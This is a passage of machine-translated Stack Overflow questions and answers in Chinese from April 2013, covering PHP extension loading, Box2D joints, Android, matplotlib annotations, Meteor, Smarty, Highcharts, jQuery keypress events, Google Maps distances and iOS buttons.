现在我知道 JSON 现在是 PHP 核心的一部分，并且没有 JSON.SO（我假设其他人也是如此）。有谁知道为什么这是一个问题？我的 php.ini 文件中没有任何 extension=XXXX.so 行。我在 Centos 6.4 下编译。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T16:10:18.690

明白了——添加了一个目录 /etc/php.d。这包含一堆 .ini 文件，这些文件被添加到 php.ini 的处理中。例如，json.ini 文件简单地说：extension=json.so

在花了太长时间寻找答案之后，我碰巧在 php -i 输出中发现了一行，指定了附加的 .ini 目录。希望有一天这可以节省一些时间。

# java - Box2d - 绳索和距离接头特征之间的折衷

> ID：16122355
> 
> 赞同：0
> 
> 时间：2013-04-20T16:02:52.100
> 
> 标签：java, box2d

几周以来我一直在努力解决这个问题，我正在使用 BOX2D 物理引擎（最新版本）制作游戏，在那里我得到了起重机，我需要绳索，所以一开始我使用了距离关节，锚点设置在起重机的钩子之间，并且它的手臂，它工作得很好。

我只是在这两个锚点之间画线，所以它看起来像一根绳子。

**距离接头：**

优点：

*   有点弹性的外观，外观和行为更逼真。
*   我可以在运行时修改绳索的长度。

缺点：

*   有一个最小的距离，所以当绳子很长时，它经常开始表现得很奇怪（试图保持最小的距离）。
    *   只能举起轻的物体

**绳索接头：**

优点：

*   可以举起任何物体，无论它有多么重
*   没有最小距离，所以保持最小距离不会变得疯狂

缺点：

*   一点都不灵活，所以不太现实。

有没有办法将它们结合起来，取得良好的效果，其中：

*   可以承受任何负载（无论它有多重）
*   可以稍微调整松紧带，使其具有更逼真的感觉
*   没有最小距离

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-21T20:32:19.467

顶部连接的绳索接头是什么？也许你可以让顶部的身体有点可移动，例如。使其动态化，并将其连接到具有软接头（如焊接接头）的静态主体（可能还有另一个绳索接头以阻止其移动太远）。

# android - TextView 未显示在其他活动中

> ID：16122356
> 
> 赞同：0
> 
> 时间：2013-04-20T16:03:05.167
> 
> 标签：android, android-intent, textview

我已经能够将数据传递给除此之外的其他活动。谁能看到我做错了什么。我得到的唯一错误是我的 TextView showmsg 没有出现在新活动中。有谁知道为什么？

```
 public class MyScanActivity extends Activity
{

private static final String MY_CARDIO_APP_TOKEN = "NOT THE PROBLEM";

final String TAG = getClass().getName();

private Button scanButton;
private TextView resultTextView;
private Button buttonBack;

private TextView showmsg;

private int MY_SCAN_REQUEST_CODE = 100; // arbitrary int

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState)
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.myscan);

    Intent in = getIntent();
    if (in.getCharSequenceExtra("usr") != null) {
        final TextView setmsg = (TextView)findViewById(R.id.showmsg);
        setmsg.setText(in.getCharSequenceExtra("usr"));             
    }

    resultTextView = (TextView)findViewById(R.id.resultTextView);
    scanButton = (Button)findViewById(R.id.scanButton);
    buttonBack = (Button)findViewById(R.id.buttonBack);
    showmsg = (TextView) findViewById(R.id.showmsg); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T14:22:01.223

对于如何不显示您的文本，没有太多选择。

1.  您的视图本身搞砸了：通过使用`android:text="TEST"`TextView showmsg 将一些示例文本放入 XML 文件中来检查这一点。您的文本应该出现，除非您的文本颜色或大小错误，或者上面碰巧有其他东西。

2.  你实际上并没有找到它`findViewById()` （我希望你已经在调试器中仔细检查过）我同意你可能不想要的 alex `R.id.showmsg`。你的意思是放在`R.id.resultTextView`那里吗？

3.  您传递的文本实际上并没有通过。您应该做一个日志语句，例如`Log.v(TAG, "Passed text is " + in.getCharSequenceExtra("urs"));`并确保文本实际上是通过的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-22T15:09:52.530

我没有测试它。但我认为这就是原因。

在这里改变：

```
if (in.getCharSequenceExtra("usr") != null) {
    final TextView setmsg = (TextView)findViewById(R.id.showmsg);
    setmsg.setText(in.getCharSequenceExtra("usr"));             
} 
```

有了这个：

```
showmsg = (TextView) findViewById(R.id.showmsg);
if (in.getCharSequenceExtra("usr") != null) {
    showmsg.setText(in.getCharSequenceExtra("usr"));             
} 
```

# android - Android 依赖项引用了不存在的库 google-play-services_lib.jar

> ID：16122358
> 
> 赞同：12
> 
> 时间：2013-04-20T16:03:47.903
> 
> 标签：android, eclipse, google-play-services

我一直在尝试让一个简单的地图出现在应用程序中，如谷歌地图 v2 文档中所示。Eclipse 一直在说：

容器“Android Dependencies”引用了不存在的库“X:\Android Development\workspace\google-play-services_lib\bin\google-play-services_lib.jar”

我在这里找到了几个有问题的人，我按照这些步骤没有运气。我安装了 Google Play 服务，我什至卸载并重新安装了它。我已将 google-play-services_lib 项目导入 Eclipse 并选中移动到工作区。

任何帮助都会很棒，因为我无法让它发挥作用。我确实检查了该位置，但那里没有文件，所以我不知道为什么它丢失了，因为我已经安装了 Google Play 服务。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-05-15T14:27:05.367

这个答案对我[有用 https://stackoverflow.com/a/16398399/1874332](https://stackoverflow.com/a/16398399/1874332)

> 我也遇到了这个问题。
> 
> 我的解决方案是，
> 
> 首先清理项目 google-play-services_lib 然后清理我的依赖于播放服务库的项目

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2014-02-25T05:00:57.700

我通过以下方式解决了这个问题：

1.  右键单击“google-play-services_lib”项目，选择“属性”。
2.  单击左侧面板上的“Android”。
3.  在“Project Build Target”上检查 Android SDK 的版本，然后选择“OK”按钮。
4.  重建 google-play_services_lib 项目，现在您在“bin”文件夹中有“google-play-services_lib.jar”。
5.  清理并重建您的项目。

详细信息：google-play-services_lib 项目的原始构建目标是 android-10。如果您没有在 Eclipse 中安装此版本的 Android SDK，则 Eclipse 只是不构建它，留下一个空的 bin 文件夹。并且我们的项目引用了这个 bin 文件夹中的一个 .jar 文件，这导致了错误消息。因此，解决这个问题只需检查 google-play-services_lib 项目的适当构建目标。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-04-20T17:51:37.943

在 Eclipse 中打开*Project* -> *Properties*。选择左侧的*安卓。*在底部检查您是否引用了带有绿色复选标记的 Google Play 服务。如果没有，请单击*添加*并添加 google play services 库

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-11-22T06:56:07.550

我找到了我的答案。我希望这可以帮助别人。

1.  我已经安装了几个版本的 Android 构建工具。（17、18、18.1、19）。我阅读了其他问题和答案。有人指出构建工具。所以，我去了 SDK 管理器，我删除了所有构建工具，但不是最新的。(19)

2.  清理谷歌播放服务。并重新构建。清理我的项目。并重新构建。

3.  瞧~！谢谢大家~！我很开心！！

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2014-03-31T19:18:27.800

我通过右键单击 google-play-services_lib 并构建项目解决了这个问题。我从工作区中“删除”了它，然后重新添加它，以确保我什么时候没有更改设置/没有更改任何重要的东西。这样构建成功。

然后我构建了我的主应用程序，它成功运行。

我遇到了奇怪的路径错误和 android-9 分辨率错误。但它现在似乎正在工作。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-05-26T06:16:24.863

我已经尝试了一切，但即使是谷歌示例项目也对我没有用，最后我已经将 sdk 和 eclipse ADT 插件中的所有包更新到 ADT 14，然后它工作正常:-)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2015-02-22T22:22:09.657

我有同样的问题。为了解决这个问题，您必须确保您的项目支持在 google-play-services-lib 中指定的相同版本的 android sdk。因此，在我的情况下，我有一个项目的最低要求 SDK 设置为 API15。[因此，一旦您按照https://developer.android.com/tools/projects/projects-eclipse.html#ReferenceLibraryProject](https://developer.android.com/tools/projects/projects-eclipse.html#ReferencingLibraryProject)中的这些步骤将 google-play-services-lib 导入到您的项目中，请确保打开您看到的 google -play-services-lib 在 Eclipse 的 Package Explorer 中。展开它，右键单击它并选择属性。在项目构建目标中，确保您检查的 SDK 至少等于项目中设置的最低要求 SDK，在我的情况下为 API15： ![在此处输入图像描述](https://i.stack.imgur.com/XMEwf.jpg)

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2013-11-15T04:20:58.170

我的解决方案是，

1.  首先清理项目 google-play-services_lib

2.  然后清理我的项目，它依赖于播放服务库

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2014-09-03T07:00:30.973

我只是重新导入了谷歌播放服务库项目，它工作了！

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2014-08-19T11:49:09.660

首先右键单击项目并导入（`google-play-services`如果存在），否则按照**@yoah**告诉的步骤（在 下导入`sdk->extra->google->google-play-service-libproject->google-play-services_lib`），如果***问题***仍然没有解决，那么多个解决方案可能存在多个问题..

**解决方案。**

1.  重启日食
2.  清理项目
3.  升级谷歌播放服务
4.  安装新的构建工具就可以了。当我更新 SDK 时，它们没有自动包含在内
5.  如果你有导入​​代码。请务必将其复制到工作空间，否则可能会发生此错误。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2013-07-02T12:01:24.413

当我更新我的 eclipse Android SDK 工具时，我遇到了同样的问题并得到了解决。
我使用的是版本 22，当我将 Android SDK 工具更新到 22.0.1 时，错误消失了，我可以构建我的项目。
我希望这可以帮助别人...

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2015-03-20T23:34:08.737

在日食中。右键单击您的项目->“Android工具”->“修复项目属性”

# java - 如何将结果保存到文本文件中？

> ID：16122359
> 
> 赞同：-3
> 
> 时间：2013-04-20T16:03:57.787
> 
> 标签：java, file, text, save

这是java中的井字游戏，有人可以解释如何将获胜次数`X`和次数保存`O`到文本文件中，我查看了类似的线程，但我不知道在这种情况下如何制作。抱歉重复，不知道如何更新最后一个问题。

```
package xo2;
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class XO2 implements ActionListener {
private int[][] winningCombination = new int[][] {
        {0, 1, 2},
                    {3, 4, 5},
                    {6, 7, 8}, 
        {0, 3, 6},
                    {1, 4, 7},
                    {2, 5, 8}, 
        {0, 4, 8},
                    {3, 4, 6}            
};
private JFrame window = new JFrame("Tic Tac Toe");
private JButton buttons[] = new JButton[9];
private int count = 0;
private String letter = "";
private boolean win = false;

public XO2(){

    window.setSize(300,300);
    window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    window.setLayout(new GridLayout(3,3));

    for(int i=0; i<9; i++){
        buttons[i] = new JButton();
        window.add(buttons[i]);
        buttons[i].addActionListener(this);
    }

    window.setVisible(true);
}

public void actionPerformed(ActionEvent a) {
    count++;

    if(count % 2 == 0){
        letter = "O";
    }
    else {
        letter = "X";
    }

    JButton pressedButton = (JButton)a.getSource();
    pressedButton.setText(letter);
    pressedButton.setEnabled(false);

    for(int i=0; i<8; i++){
        if( buttons[winningCombination[i][0]].getText().equals(buttons[winningCombination[i][1]].getText()) &&
                buttons[winningCombination[i][1]].getText().equals(buttons[winningCombination[i][2]].getText()) &&
                !buttons[winningCombination[i][0]].getText().equals("")){
            win = true;
        }
    }

    if(win == true){
        JOptionPane.showMessageDialog(null, letter + " Won!");
        System.exit(0);
    } else if(count == 9 && win == false){
        JOptionPane.showMessageDialog(null, "Draw!");
        System.exit(0);
    }
}

public static void main(String[] args){
    XO2 starter = new XO2();
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T17:03:05.580

将您的代码更改为此

编辑代码 3

```
import java.awt.*;
import java.awt.event.*;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.StringWriter;

import javax.swing.*;

        public class XO2 implements ActionListener {
        private int[][] winningCombination = new int[][] {
                {0, 1, 2},
                            {3, 4, 5},
                            {6, 7, 8}, 
                {0, 3, 6},
                            {1, 4, 7},
                            {2, 5, 8}, 
                {0, 4, 8},
                            {3, 4, 6}            
        };
        private JFrame window = new JFrame("Tic Tac Toe");
        private JButton buttons[] = new JButton[9];
        private int count = 0;
        private String letter = "";
        private boolean win = false;

        public XO2(){

            window.setSize(300,300);
            window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            window.setLayout(new GridLayout(3,3));

            for(int i=0; i<9; i++){
                buttons[i] = new JButton();
                window.add(buttons[i]);
                buttons[i].addActionListener(this);
            }

            window.setVisible(true);
        }

        public void actionPerformed(ActionEvent a) {
            count++;

            if(count % 2 == 0){
                letter = "O";
            }
            else {
                letter = "X";
            }

            JButton pressedButton = (JButton)a.getSource();
            pressedButton.setText(letter);
            pressedButton.setEnabled(false);

            for(int i=0; i<8; i++){
                if( buttons[winningCombination[i][0]].getText().equals(buttons[winningCombination[i][1]].getText()) &&
                        buttons[winningCombination[i][1]].getText().equals(buttons[winningCombination[i][2]].getText()) &&
                        !buttons[winningCombination[i][0]].getText().equals("")){
                    win = true;
                }
            }

            if(win == true){
                JOptionPane.showMessageDialog(null, letter + " Won!");
                try {
                    PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter( "c:\\calc\\output.txt", true)));
                    out.println(letter + "Won!");
                    out.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                System.exit(0);
            } else if(count == 9 && win == false){
                JOptionPane.showMessageDialog(null, "Draw!");
                try {
                    PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter( "c:\\calc\\output.txt", true)));
                    out.println("Draw!");
                    out.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                System.exit(0);
            }
        }

        public static void main(String[] args){
            XO2 starter = new XO2();
        }

} 
```

并确保在添加之前创建了要写入的文本文件

我添加的代码用双星号标记

希望这可以帮助

# python - Python/Matplotlib - 如何将文本放在等宽图形的角落

> ID：16122362
> 
> 赞同：21
> 
> 时间：2013-04-20T16:04:11.403
> 
> 标签：python, matplotlib

我想把文字放在等宽高图的右下角。我通过 ax.transAxes 设置相对于图形的位置，但我必须根据每个图形的高度比例手动定义相对坐标值。

什么是了解轴高度比例和脚本中正确文本位置的好方法？

```
 ax = plt.subplot(2,1,1)
 ax.plot([1,2,3],[1,2,3])
 ax.set_aspect('equal')
 ax.text(1,-0.15, 'text', transform=ax.transAxes, ha='right', fontsize=16)
 print ax.get_position().height

 ax = plt.subplot(2,1,2)
 ax.plot([10,20,30],[1,2,3])
 ax.set_aspect('equal')
 ax.text(1,-0.15, 'text', transform=ax.transAxes, ha='right', fontsize=16)
 print ax.get_position().height 
```

![在此处输入图像描述](https://i.stack.imgur.com/vI27V.png)

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2013-04-20T16:37:14.850

使用`annotate`.

事实上，我几乎从不使用`text`. 即使我想在数据坐标中放置东西，我通常也想以点为单位偏移一些固定距离，这更容易使用`annotate`.

举个简单的例子：

```
import matplotlib.pyplot as plt

fig, axes = plt.subplots(nrows=2, subplot_kw=dict(aspect=1))

axes[0].plot(range(1, 4))
axes[1].plot(range(10, 40, 10), range(1, 4))

for ax in axes:
    ax.annotate('Test', xy=(1, 0), xycoords='axes fraction', fontsize=16,
                horizontalalignment='right', verticalalignment='bottom')
plt.show() 
```

![在此处输入图像描述](https://i.stack.imgur.com/zYte5.png)

如果您希望它稍微偏离角落，您可以通过`xytext`kwarg 指定偏移量（并`textcoords`控制如何`xytext`解释 的值）。我也在此处使用`ha`and的`va`缩写`horizontalalignment`和缩写`verticalalignment`：

```
import matplotlib.pyplot as plt

fig, axes = plt.subplots(nrows=2, subplot_kw=dict(aspect=1))

axes[0].plot(range(1, 4))
axes[1].plot(range(10, 40, 10), range(1, 4))

for ax in axes:
    ax.annotate('Test', xy=(1, 0), xycoords='axes fraction', fontsize=16,
                xytext=(-5, 5), textcoords='offset points',
                ha='right', va='bottom')
plt.show() 
```

![在此处输入图像描述](https://i.stack.imgur.com/f5XZL.png)

如果您尝试将其放置在轴下方，则可以使用偏移量将其放置在点以下设定的距离：

```
import matplotlib.pyplot as plt

fig, axes = plt.subplots(nrows=2, subplot_kw=dict(aspect=1))

axes[0].plot(range(1, 4))
axes[1].plot(range(10, 40, 10), range(1, 4))

for ax in axes:
    ax.annotate('Test', xy=(1, 0), xycoords='axes fraction', fontsize=16,
                xytext=(0, -15), textcoords='offset points',
                ha='right', va='top')
plt.show() 
```

![在此处输入图像描述](https://i.stack.imgur.com/39oCK.png)

还可以查看[Matplotlib 注释指南](http://matplotlib.org/users/annotations_guide.html)以获取更多信息。

# javascript - 从 Meteor 集合中获取数据时遇到问题

> ID：16122364
> 
> 赞同：0
> 
> 时间：2013-04-20T16:04:12.330
> 
> 标签：javascript, meteor

有人可以向我解释一下吗：如果我从浏览器控制台中的集合中获取数据，它可以正常工作，但是在呈现模板（使用相同集合）的同时，它会抛出异常作为查询结果为空。我究竟做错了什么？

```
Hubs = new Meteor.Collection("hubs");
Meteor.subscribe("hubs");
Template.thread.posts = function() {
    var hubName = 'foo',
        thread = Session.get("currentThread"),
        hub = Hubs.find({ name: hubName }).fetch()[0];
//throws: "Uncaught TypeError: Cannot read property 'threads' of undefined "
    return hub.threads[thread].posts;
}

//this being executed in browser's console yeilds an object:
Hubs.find({name: 'foo'}).fetch()[0] 
```

不过，使用相同集合的其他模板工作正常

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:13:25.030

当 Meteor 最初在浏览器上加载时，它还没有来自服务器集合的数据。

它们需要很短的时间才能可用。所以你只需要处理没有提供结果的情况。当数据到达时，反应应该用新数据更新你的所有模板。

你可以使用类似的东西：

```
hub = Hubs.findOne({ name: hubName })
if(hub) return hub.threads[thread].posts; 
```

`findOne`是`find().fetch[0]`. 因此，如果没有结果，即`null`没有返回任何内容，也`.threads`不会被读取，因此不会出现异常。

# php - 在foreach中使用分配的数组和smarty中的变量名

> ID：16122372
> 
> 赞同：0
> 
> 时间：2013-04-20T16:04:47.757
> 
> 标签：php, variables, foreach, smarty

我在我的 PHP 程序中分配了一个数组，这个 smarty 变量的名称是变量，

```
while ($order=mysql_fetch_object($orderQuery){
   while ($res = mysql_fetch_object($query)) {
      $smarty->append("v".$order->id,$res);
   }
   $smarty->append("order",$order);
} 
```

然后在我的`.tpl`文件中我使用以下代码：

```
{foreach $order as $o}
   Order id is : {$o->id}
   {foreach $v|cat:$o->id as $a}
      <a href="#">{$a->name}</a>
   {/foreach}
   <br />
{/foreach} 
```

`$o`工作没有任何问题，我可以显示订单 ID，但内部不`foreach`工作，我没有收到任何错误！

问题是什么 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T17:01:16.993

我找到了正确的方法:-)

我应该在 smarty 中使用可变变量，所以我将模板更改为：

```
{foreach $order as $o}
   Order id is : {$o->id}
   {assign vo 'v'|cat:$o->id}
   {foreach ${$vo} as $a}
      <a href="#">{$a->name}</a>
   {/foreach}
   <br />
{/foreach} 
```

# javascript - 如何在highcharts的yAxis上仅在0上显示网格线？

> ID：16122375
> 
> 赞同：5
> 
> 时间：2013-04-20T16:05:04.293
> 
> 标签：javascript, graph, charts, highcharts

我有一个高图表，一切都在下面的模型中进行。但是有几件事我被困住了。有没有一种方法可以从 yAxis 中删除所有网格线，除了 0 中的一个，如下图所示的带有 highcharts 的网格线？还是我们必须使用我们自己的 javascript 来完成它？此外，我们能否显示灰色区域，例如 yAxis 标签和图表之间的区域以及图表右侧（图表末端）的区域？

![图形模型](https://i.stack.imgur.com/wVSqD.jpg)

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-04-22T10:04:24.013

您可以将 gridLineWidth 设置为 0。[http://api.highcharts.com/highcharts#xAxis.gridLineWidth](http://api.highcharts.com/highcharts#xAxis.gridLineWidth)

示例：http: [//jsfiddle.net/ssQVJ/](http://jsfiddle.net/ssQVJ/)

```
yAxis: {
        gridLineColor: '#197F07',
        gridLineWidth: 0,
        lineWidth:1,
         plotLines: [{
            color: '#FF0000',
            width: 1,
            value: 0
        }]
    }, 
```

# jquery - 使用 jQuery 触发按键

> ID：16122380
> 
> 赞同：7
> 
> 时间：2013-04-20T16:05:39.370
> 
> 标签：jquery, keypress

在[Definitive Trigger Keypress jQuery 线程](https://stackoverflow.com/questions/832059/definitive-way-to-trigger-keypress-events-with-jquery)上，没有可用的 JSFiddle 作为答案，并且那里的代码对我不起作用。

```
$("button").click(function () {
    $("input").focus();
    var e = jQuery.Event("keydown");
    e.which = 77; // # Some key code value
    $("input").trigger(e);
}) 
```

这是我的代码，这是我的小提琴 [http://jsfiddle.net/Z8adb/](http://jsfiddle.net/Z8adb/)

单击时，输入中应出现 M，因为输入已获得焦点并触发了 keyCode 为 77（“m”）的 keydown。

有任何想法吗？

编辑：我这样做的真正目的是在 Sublime 视频上触发“m”热键，以便以编程方式使视频静音。这是我在 Stack Overflow 的帮助下确保正确触发“m”键的第一步。但是，我仍然无法在视频上以编程方式触发事件。我认为这只是 Sublime Video 的一个问题，但我不确定，任何人对强制按键和点击的看法都会很棒。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-20T16:25:54.577

使用触发器，您只是使用键码触发事件，而不是将值分配给文本框。试试这个：- [http://jsfiddle.net/PbHD2/](http://jsfiddle.net/PbHD2/)

[String.fromCharCode](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/fromCharCode)

```
$("button").click(function() {
     $("input").focus();
    var e = jQuery.Event("keydown");
    e.which = 77; // # Some key code value
    $("input").val(String.fromCharCode(e.which));
    $("input").trigger(e);
});
$('input').keydown(function(e){
   console.log('Yes keydown triggered. ' + e.which)
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T17:55:15.163

SublimeVideo 是一个 HTML5 播放器，没错。如果是这样，您可以使用属性将其静音，对吗？

```
$("video#yourVideoTagId").prop("muted", true); 
```

# javascript - 多点之间的最短距离

> ID：16122381
> 
> 赞同：0
> 
> 时间：2013-04-20T16:05:42.333
> 
> 标签：javascript, google-maps, google-maps-api-3

所以我想计算我的起点和多个点之间的距离，而不是显示到这一点的最短路线，但它总是告诉我最后一点。这是我的 distanceCal 函数，它工作正常：

```
function getDistanceFromLatLonInKm(lat1, lon1, lat2, lon2) {
var R = 6371; // Radius of the earth in km
var dLat = deg2rad(lat2 - lat1);  // deg2rad below
var dLon = deg2rad(lon2 - lon1);
var a =
  Math.sin(dLat / 2) * Math.sin(dLat / 2) +
  Math.cos(deg2rad(lat1)) * Math.cos(deg2rad(lat2)) *
  Math.sin(dLon / 2) * Math.sin(dLon / 2)
;
var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
var d = R * c; // Distance in km
return d;
}

function deg2rad(deg) {
 return deg * (Math.PI / 180)
} 
```

这是我的观点 latt/long ：

```
var dist = [
  [35.733972, -5.881999],
  [ 35.734077, -5.881033],
  [ 35.736898, -5.877771],
  [35.738396, -5.875154]
  ]; 
```

然后我的脚本显示方向：

```
function calcRoute() {
var start = new google.maps.LatLng(35.728329, -5.882750);
for (var i = 0; i < dist.length; i++)
{
    var dis = dist[i];
    //here i need something to choose the shortest route
    var min = Math.min(getDistanceFromLatLonInKm(35.728329, -5.882750, dis[0], dis[1]));
    var end = new google.maps.LatLng(dis[0], dis[1]);
}
    var request = {
        origin: start,
        destination: end,
        optimizeWaypoints: true,
        travelMode: google.maps.DirectionsTravelMode.DRIVING
    };

directionsService.route(request, function (response, status) {
    if (status == google.maps.DirectionsStatus.OK) {
        directionsDisplay.setDirections(response);
    }
});

}
google.maps.event.addDomListener(window, 'load', getMap); 
```

所以如果有人有任何想法或解决方案，我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T19:08:01.250

以下代码使用谷歌[**几何**](https://developers.google.com/maps/documentation/javascript/geometry)库计算点之间的距离。距离存储在一个数组中，然后解析以找到最小距离。

我已将数组从 dist[] 更改为 coords[]，因为我们需要一个数组来保存距离 dist[]。

```
<script type="text/javascript" src="//maps.googleapis.com/maps/api/js?libraries=geometry&sensor=false"></script>
<script type="text/javascript">
 var coords = [
  [35.733972, -5.881999],
  [35.734077, -5.881033],
  [35.736898, -5.877771],
  [35.738396, -5.875154]
  ];
  var dist = [];//Array to hold distances
   function calcRoute() { {
      var start = new google.maps.LatLng(35.728329, -5.882750);
      for (var i = 0; i < coords.length; i++){
        var point = new google.maps.LatLng(coords[i][0],coords[i][1]);
        var distance = google.maps.geometry.spherical.computeDistanceBetween(start, point);
        dist.push(distance);
       }  
        var test = dist[0];
   var index = 0;
   for (var i = 1; i < dist.length; i++){
        if(dist[i] < test){
            test = dist[i];
            index = i;
        }
    }
   var end = new google.maps.LatLng(coords[index][0],coords[index][1]);

       // Apply the rest of your code here 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T20:21:31.463

听起来您想在[DirectionsServiceRequest](https://developers.google.com/maps/documentation/javascript/reference#DirectionsRequest)中使用 optimizeWaypoints:true ：

> 优化航点 | 布尔值 | 如果设置为 true，DirectionService 将尝试重新排序提供的中间路点，以最小化路线的总体成本。如果航点已优化，请检查响应中的 DirectionsRoute.waypoint_order 以确定新的排序。

[方向](https://developers.google.com/maps/documentation/javascript/reference#DirectionsResult)结果

[返回的每条路线的](https://developers.google.com/maps/documentation/javascript/reference#DirectionsLeg)每一段都包含距离和持续时间信息。

# google-app-engine - 在 GAE 上的 persistence.xml 中列出的必需实体？

> ID：16122382
> 
> 赞同：0
> 
> 时间：2013-04-20T16:05:47.727
> 
> 标签：google-app-engine, jpa, jersey, guice, datanucleus

我正在开发一个使用 GAE、Guice、JPA 2.0 和 Jersey 的应用程序。我想摆脱将每个实体类作为一个`<class>`元素添加到我的 persistence.xml 中。

[这个问题](https://stackoverflow.com/questions/1780341/do-i-need-class-elements-in-persistence-xml)的答案只谈论 Hibernate，但 AFAIK 仅支持 Google App Engine 的 JPA 提供程序是 DataNucleus。

我的项目结构（我现在唯一的实体是 TestObject.java；目标目录是通过 Maven 生成的）：

```
├── README.md
├── datanucleus.log
├── nb-configuration.xml
├── pom.xml
├── src
│   └── main
│       ├── java
│       │   └── cz
│       │       └── cvut
│       │           └── oi
│       │               └── wa2
│       │                   ├── ioc
│       │                   │   ├── Configuration.java
│       │                   │   └── ServletListener.java
│       │                   └── rest
│       │                       ├── JSONService.java
│       │                       └── TestObject.java
│       ├── resources
│       │   └── META-INF
│       │       └── persistence.xml
│       └── webapp
│           └── WEB-INF
│               ├── appengine-web.xml
│               └── web.xml
└── target
    ├── classes
    │   ├── META-INF
    │   │   └── persistence.xml
    │   └── cz
    │       └── cvut
    │           └── oi
    │               └── wa2
    │                   ├── ioc
    │                   └── rest
    ├── generated-sources
    │   └── annotations
    ├── maven-archiver
    │   └── pom.properties
    ├── rss-reader-backend-1.0-SNAPSHOT
    │   ├── META-INF
    │   └── WEB-INF
    │       ├── appengine-generated
    │       │   └── local_db.bin
    │       ├── appengine-web.xml
    │       ├── classes
    │       │   └── META-INF
    │       │       └── persistence.xml
    │       ├── lib
    │       │   ├── activation-1.1.jar
    │       │   ├── aopalliance-1.0.jar
    │       │   ├── appengine-api-1.0-sdk-1.7.7.jar
    │       │   ├── asm-3.1.jar
    │       │   ├── datanucleus-api-jpa-3.0.11.jar
    │       │   ├── datanucleus-appengine-2.0.1.jar
    │       │   ├── datanucleus-core-3.0.11.jar
    │       │   ├── geronimo-jpa_2.0_spec-1.1.jar
    │       │   ├── guice-3.0.jar
    │       │   ├── guice-persist-3.0.jar
    │       │   ├── guice-servlet-3.0.jar
    │       │   ├── jackson-core-asl-1.9.2.jar
    │       │   ├── jackson-jaxrs-1.9.2.jar
    │       │   ├── jackson-mapper-asl-1.9.2.jar
    │       │   ├── jackson-xc-1.9.2.jar
    │       │   ├── javax.inject-1.jar
    │       │   ├── jaxb-api-2.2.2.jar
    │       │   ├── jaxb-impl-2.2.3-1.jar
    │       │   ├── jdo-api-3.0.1.jar
    │       │   ├── jersey-core-1.17.1.jar
    │       │   ├── jersey-guice-1.17.1.jar
    │       │   ├── jersey-json-1.17.1.jar
    │       │   ├── jersey-server-1.17.1.jar
    │       │   ├── jersey-servlet-1.17.1.jar
    │       │   ├── jettison-1.1.jar
    │       │   ├── jta-1.1.jar
    │       │   ├── rss-reader-backend-1.0-SNAPSHOT.jar
    │       │   └── stax-api-1.0-2.jar
    │       └── web.xml
    ├── rss-reader-backend-1.0-SNAPSHOT.war
    └── surefire 
```

这个devstack可以满足我的要求吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:50:32.237

当与 JavaEE 或 JavaSE 一起使用时，如果**exclude-unlisted-classes**不存在，DataNucleus 核心当然[支持类路径扫描。](http://www.datanucleus.org/products/accessplatform_3_2/jpa/persistence_unit.html)日志（调试级别）将显示正在发现的内容。

# ios - 为什么在删除所有子视图后我不能设置 UIButton 的 backgroundImage

> ID：16122383
> 
> 赞同：0
> 
> 时间：2013-04-20T16:05:54.103
> 
> 标签：ios, objective-c, uibutton, background-image, superview

只是在使用 UIButton 时遇到了一些困难。我使用删除所有子视图

```
for (UIView *v in button.subviews) {
    [v removeFromSuperview];
} 
```

但我想在之后使用设置背景图像

```
[button setBackgroundImage:[UIImage imageNamed:@"backgroundImage.png"] forState:UIControlStateNormal]; 
```

什么也没有发生。如果我不删除所有子视图，那么前面的代码就可以工作。

那么是否有可能删除所有子视图实际上也会删除背景图像，在这种情况下，是否可以将背景图像放回原处？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:08:15.953

是的，根据您的经验，背景图像似乎使用单独的子视图显示。简短的回答：而不是强奸糟糕的视图层次结构（无论如何都是私有的），你应该跟踪你自己添加的子视图并只删除那些。

# ruby - 如何替换哈希中包含的值？

> ID：16122384
> 
> 赞同：1
> 
> 时间：2013-04-20T16:05:56.133
> 
> 标签：ruby, arrays, hash

我有一个哈希数组：

```
arr = [
  {:key1=>"foo one bar", :key2=>"two", :key3=>"three"},
  {:key1=>"four", :key2=>"five", :key3=>"six"},
